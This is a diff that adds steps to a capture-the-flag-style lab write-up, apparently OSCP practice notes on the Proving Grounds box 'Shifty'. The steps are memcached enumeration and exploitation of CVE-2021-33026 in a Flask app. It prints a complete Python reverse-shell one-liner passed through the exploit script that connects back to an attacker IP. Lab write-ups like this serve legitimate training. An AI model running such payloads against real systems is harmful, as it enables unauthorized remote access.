@@ -68,3 +68,50 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Thu Dec 16 12:00:56 2021 -- 1 IP address (1 host up) scanned in 372.78 seconds
 
 ```
+
+I do not find the available vulnerability on the port 80 and 5000 website, so start checking service on 11211 port.
+
+After a quick searching I understand the use of memcache. Installing the tools to help to easy get the information from memcache service.
+
+```
+sudo apt install libmemcached-tools
+```
+
+The stat command can show us some access information, but nothing useful.
+
+```
+memcstat --servers=192.168.100.59
+```
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shifty/Shifty_2022.01.01_13h41m57s_001_.png)
+
+
+Next we try to get the website store items, but it doesn't return anything back.
+
+```
+memcdump --servers=192.168.100.59
+```
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shifty/Shifty_2022.01.01_13h52m35s_002_.png)
+
+We have to browse the website on port 5000 first and it will generate the session.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shifty/Shifty_2022.01.01_14h00m00s_003_.png)
+
+I was stuck here for a long time and then I accidentally noticed that this is a demo site made with FLASK, so I tried to search for FLASK, memcache and exploit as keywords and found vulnerability [CVE-2021-33026](https://github.com/CarlosG13/CVE-2021-33026).
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shifty/Shifty_2022.01.01_14h01m53s_004_.png)
+
+Following the instructions for using the vulnerability We try to send the remote shell command.
+
+```
+python3 cve-2021-33026_PoC.py --rhost 192.168.100.59 --rport 5000 --cmd "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.100\",11211));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'" --cookie "session:f246b931-de84-4794-ba25-59c4bd3835df" 
+```
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shifty/Shifty_2022.01.01_14h28m16s_005_.png)
+
+Successfully obtained shell.
+
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shifty/Shifty_2022.01.01_14h28m41s_006_.png)
+
+
